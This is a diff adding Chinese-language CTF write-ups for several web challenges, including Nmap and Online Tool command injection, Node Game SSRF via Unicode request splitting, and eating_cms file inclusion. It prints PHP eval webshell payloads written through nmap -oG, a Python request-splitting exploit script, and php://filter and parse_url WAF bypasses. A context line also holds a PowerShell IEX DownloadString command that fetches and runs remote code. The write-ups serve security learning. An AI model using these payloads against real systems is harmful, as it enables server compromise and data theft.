@@ -1104,5 +1104,372 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.git
 
 [IIS的搭建教程](https://blog.csdn.net/qq_36348823/article/details/81367819)
 
+## [网鼎杯 2020 朱雀组]Nmap
 
+nmap命令注入，nmap有一个参数`-oG`可以输出到文件中
+
+```
+-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3, and Grepable format, respectively, to the given filename.
+```
+
+fuzz发现过滤，考虑绕过后输入
+
+```
+' <?= @eval($_POST["hack"]);?> -oG hack.phtml '
+```
+
+写入webshell，包含即可，根目录获得flag
+
+```
+flag{3b2f5fa1-30d6-4de8-b2ba-67440e0a9284}
+```
+
+## [BUUCTF 2018]Online Tool
+
+和上一题是相近的知识点。
+
+```php
+<?php
+
+if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
+}
+
+if(!isset($_GET['host'])) {
+    highlight_file(__FILE__);
+} else {
+    $host = $_GET['host'];
+    $host = escapeshellarg($host);
+    $host = escapeshellcmd($host);
+    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
+    echo 'you are in sandbox '.$sandbox;
+    @mkdir($sandbox);
+    chdir($sandbox);
+    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
+}
+```
+
+还涉及到一个转义连用漏洞问题：是由于后者仅转义不配对引号所导致。
+
+[PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)
+
+```
+escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数
+escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 。
+
+escapeshellcmd — shell 元字符转义
+escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。
+反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$\, \x0A 和 \xFF。 ' 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。
+```
+
+> 1. curl $args ，传入的参数是：`172.17.0.2' -v -d a=1`
+> 2. 经过`escapeshellarg`处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。
+> 3. 经过`escapeshellcmd`处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为`escapeshellcmd`对`\`以及最后那个**不配对儿**的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php
+> 4. 最后执行的命令是`curl '172.17.0.2'\\'' -v -d a=1\'`，由于中间的`\\`被解释为`\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\ -v -d a=1'`，即向`172.17.0.2\`发起请求，POST 数据为`a=1'`。
+
+尝试一下
+
+```
+输入的host是  'asd'
+命令结果  nmap -T5 -sT -Pn --host-timeout 2 -F ''\\''asd'\\'''
+第一步escapeshellarg: ''\''asd'\'''，原理是这样 1.''   2.\'   3.'asd'  4.\'   5.''
+第二步escapeshellcmd: ''\\''asd'\\'''
+在shell中相当于 ''  \ ''  asd  '\'  ''
+```
+
+把沙盒位置获取后就可以命令注入了。
+
+```
+9b68bb95b66b273c20218ccd125dab22
+' <?= @eval($_POST["hack"]);?> -oG hack.php '
+flag{c177c3ed-9104-4383-afc4-f77c245cc039}
+```
+
+## [GYCTF2020]Node Game
+
+source  注意：题目也特别强调了 Node 版本为 8.12.0
+
+```js
+var express = require('express');
+var app = express();
+var fs = require('fs');
+var path = require('path');
+var http = require('http');
+var pug = require('pug');
+var morgan = require('morgan');
+const multer = require('multer');
+
+
+app.use(multer({dest: './dist'}).array('file'));
+app.use(morgan('short'));
+app.use("/uploads",express.static(path.join(__dirname, '/uploads')))
+app.use("/template",express.static(path.join(__dirname, '/template')))
+
+
+app.get('/', function(req, res) {
+    var action = req.query.action?req.query.action:"index";
+    if( action.includes("/") || action.includes("\\") ){
+        res.send("Errrrr, You have been Blocked");
+    }
+    file = path.join(__dirname + '/template/'+ action +'.pug');
+    var html = pug.renderFile(file);
+    res.send(html);
+});
+
+app.post('/file_upload', function(req, res){
+    var ip = req.connection.remoteAddress;
+    var obj = {
+        msg: '',
+    }
+    if (!ip.includes('127.0.0.1')) {
+        obj.msg="only admin's ip can use it"
+        res.send(JSON.stringify(obj));
+        return 
+    }
+    fs.readFile(req.files[0].path, function(err, data){
+        if(err){
+            obj.msg = 'upload failed';
+            res.send(JSON.stringify(obj));
+        }else{
+            var file_path = '/uploads/' + req.files[0].mimetype +"/";
+            var file_name = req.files[0].originalname
+            var dir_file = __dirname + file_path + file_name
+            if(!fs.existsSync(__dirname + file_path)){
+                try {
+                    fs.mkdirSync(__dirname + file_path)
+                } catch (error) {
+                    obj.msg = "file type error";
+                    res.send(JSON.stringify(obj));
+                    return
+                }
+            }
+            try {
+                fs.writeFileSync(dir_file,data)
+                obj = {
+                    msg: 'upload success',
+                    filename: file_path + file_name
+                } 
+            } catch (error) {
+                obj.msg = 'upload failed';
+            }
+            res.send(JSON.stringify(obj));    
+        }
+    })
+})
+
+app.get('/source', function(req, res) {
+    res.sendFile(path.join(__dirname + '/template/source.txt'));
+});
+
+app.get('/core', function(req, res) {
+    var q = req.query.q;
+    var resp = "";
+    if (q) {
+        var url = 'http://localhost:8081/source?' + q
+        console.log(url)
+        var trigger = blacklist(url);
+        if (trigger === true) {
+            res.send("<p>error occurs!</p>");
+        } else {
+            try {
+                http.get(url, function(resp) {
+                    resp.setEncoding('utf8');
+                    resp.on('error', function(err) {
+                    if (err.code === "ECONNRESET") {
+                     console.log("Timeout occurs");
+                     return;
+                    }
+                   });
+
+                    resp.on('data', function(chunk) {
+                        try {
+                         resps = chunk.toString();
+                         res.send(resps);
+                        }catch (e) {
+                           res.send(e.message);
+                        }
+ 
+                    }).on('error', (e) => {
+                         res.send(e.message);});
+                });
+            } catch (error) {
+                console.log(error);
+            }
+        }
+    } else {
+        res.send("search param 'q' missing!");
+    }
+})
+
+function blacklist(url) {
+    var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];
+    var arrayLen = evilwords.length;
+    for (var i = 0; i < arrayLen; i++) {
+        const trigger = url.includes(evilwords[i]);
+        if (trigger === true) {
+            return true
+        }
+    }
+}
+
+var server = app.listen(8081, function() {
+    var host = server.address().address
+    var port = server.address().port
+    console.log("Example app listening at http://%s:%s", host, port)
+})
+```
+
+知识点：
+
+Node的Unicode处理不当引起的HTTP注入，引发SSRF
+
+https://xz.aliyun.com/t/2894#toc-0
+
+https://github.com/nodejs/node/issues/13296
+
+利用PUG模板进行文件包含
+
+https://pugjs.org/zh-cn/language/includes.html
+
+题目就利用了q参数进行SSRF，上传文件来文件包含。
+
+特别要注意 Content-Type 要改，还有上面的 Connection 必须改为 Keep-Alive，这样才能几个请求一起夹带进去。发送一下，然后把右边的 HTTP 包内容拷贝上。脚本如下
+
+```python
+import urllib.parse
+import requests
+
+payload = ''' HTTP/1.1
+Host: x
+Connection: keep-alive
+
+POST /file_upload HTTP/1.1
+Content-Type: multipart/form-data; boundary=--------------------------919695033422425209299810
+Connection: keep-alive
+cache-control: no-cache
+Host: x
+Content-Length: 292
+
+----------------------------919695033422425209299810
+Content-Disposition: form-data; name="file"; filename="eli0t.pug"
+Content-Type: /../template
+
+doctype html
+html
+  head
+    style
+      include ../../../../../../../flag.txt
+
+----------------------------919695033422425209299810--
+
+GET /flag HTTP/1.1
+Host: x
+Connection: close
+x:'''
+payload = payload.replace("\n", "\r\n")
+payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)
+print(payload)
+r = requests.get('http://fbc4ecae-bc69-4cfd-8b3a-15cc50bae71c.node3.buuoj.cn/core?q=' + urllib.parse.quote(payload))
+print(r.text)
+```
+
+看到payload最后长这个样子，我们尝试分析一下这行代码
+
+`payload = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16)) for c in payload)`
+
+```
+＠ｈｔｔｐＯＱＮＱ－＊ｈｯｳｴＺ＠ｸ－＊ｃｯｮｮ･｣ｴｩｯｮＺ＠ｫ･･ｰＭ｡ｬｩｶ･－＊－＊ｐｏｓｔ＠Ｏｦｩｬ･｟ｵｰｬｯ｡､＠ｈｔｔｐＯＱＮＱ－＊ｃｯｮｴ･ｮｴＭｔｹｰ･Ｚ＠ｭｵｬｴｩｰ｡ｲｴＯｦｯｲｭＭ､｡ｴ｡［＠｢ｯｵｮ､｡ｲｹ］ＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＹＱＹＶＹＵＰＳＳＴＲＲＴＲＵＲＰＹＲＹＹＸＱＰ－＊ｃｯｮｮ･｣ｴｩｯｮＺ＠ｫ･･ｰＭ｡ｬｩｶ･－＊｣｡｣ｨ･Ｍ｣ｯｮｴｲｯｬＺ＠ｮｯＭ｣｡｣ｨ･－＊ｈｯｳｴＺ＠ｸ－＊ｃｯｮｴ･ｮｴＭｌ･ｮｧｴｨＺ＠ＲＹＲ－＊－＊ＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＹＱＹＶＹＵＰＳＳＴＲＲＴＲＵＲＰＹＲＹＹＸＱＰ－＊ｃｯｮｴ･ｮｴＭｄｩｳｰｯｳｩｴｩｯｮＺ＠ｦｯｲｭＭ､｡ｴ｡［＠ｮ｡ｭ･］Ｂｦｩｬ･Ｂ［＠ｦｩｬ･ｮ｡ｭ･］Ｂ･ｬｩＰｴＮｰｵｧＢ－＊ｃｯｮｴ･ｮｴＭｔｹｰ･Ｚ＠ＯＮＮＯｴ･ｭｰｬ｡ｴ･－＊－＊､ｯ｣ｴｹｰ･＠ｨｴｭｬ－＊ｨｴｭｬ－＊＠＠ｨ･｡､－＊＠＠＠＠ｳｴｹｬ･－＊＠＠＠＠＠＠ｩｮ｣ｬｵ､･＠ＮＮＯＮＮＯＮＮＯＮＮＯＮＮＯＮＮＯＮＮＯｦｬ｡ｧＮｴｸｴ－＊－＊ＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＭＹＱＹＶＹＵＰＳＳＴＲＲＴＲＵＲＰＹＲＹＹＸＱＰＭＭ－＊－＊ｇｅｔ＠Ｏｦｬ｡ｧ＠ｈｔｔｐＯＱＮＱ－＊ｈｯｳｴＺ＠ｸ－＊ｃｯｮｮ･｣ｴｩｯｮＺ＠｣ｬｯｳ･－＊ｸＺ
+```
+
+查阅一些资料可以发现规律，字符转换仅仅保留了字符的最后两位字节。所以脚本中只是在字符前面加了0xff而已。
+
+```
+#Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString() 
+#Unicode čĊ will convert to latin1 which will only pick up the right most byte
+SPACE=u'\u0120'.encode('utf-8')
+CRLF=u'\u010d\u010a'.encode('utf-8')  # transfer from unicode to utf-8 (\uxxxx is unicode's pattern)
+SLASH=u'\u012f'.encode('utf-8')
+
+注意space、crlf的编码
+```
+
+## [N1CTF 2018]eating_cms
+
+fuzz出register.php注册进入
+
+黑盒测试，发现url的page参数对应的是php文件。于是伪协议包含一下
+
+```php
+user.php?page=php://filter/convert.base64-encode/resource=user
+```
+
+![09DHvF.png](https://s1.ax1x.com/2020/09/25/09DHvF.png)
+
+审计代码，发现有一个flag文件，直接包含会被WAF，然而WAF中是这样过滤的
+
+```php
+function filter_directory_guest()
+{
+    $keywords = ["flag","manage","ffffllllaaaaggg","info"];
+    $uri = parse_url($_SERVER["REQUEST_URI"]);
+    parse_str($uri['query'], $query);
+//    var_dump($query);
+//    die();
+    foreach($keywords as $token)
+    {
+        foreach($query as $k => $v)
+        {
+            if (stristr($k, $token))
+                hacker();
+            if (stristr($v, $token))
+                hacker();
+        }
+    }
+}
+```
+
+于是可以用一些函数解析不出的方法绕过，比如
+
+```
+//user.php?...
+```
+
+然后获得flag和manage，并且发现了一个upload。
+
+```php
+ m4aaannngggeee 这里是真正的上传点
+ 
+ <?php
+$allowtype = array("gif","png","jpg");
+$size = 10000000;
+$path = "./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/";
+$filename = $_FILES['file']['name'];
+if(is_uploaded_file($_FILES['file']['tmp_name'])){
+    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){
+        die("error:can not move");
+    }
+}else{
+    die("error:not an upload file！");
+}
+$newfile = $path.$filename;
+echo "file upload success<br />";
+echo $filename;
+$picdata = system("cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/".$filename." | base64 -w 0");
+echo "<img src='data:image/png;base64,".$picdata."'></img>";
+if($_FILES['file']['error']>0){
+    unlink($newfile);
+    die("Upload file error: ");
+}
+$ext = array_pop(explode(".",$_FILES['file']['name']));
+if(!in_array($ext,$allowtype)){
+    unlink($newfile);
+}
+?>
+```
+
+这里直接命令注入，就可以发现flag
+
+[parse_url解析漏洞](https://www.cnblogs.com/Lee-404/p/12826352.html)
+
+## [watevrCTF-2019]Pickle Store
 
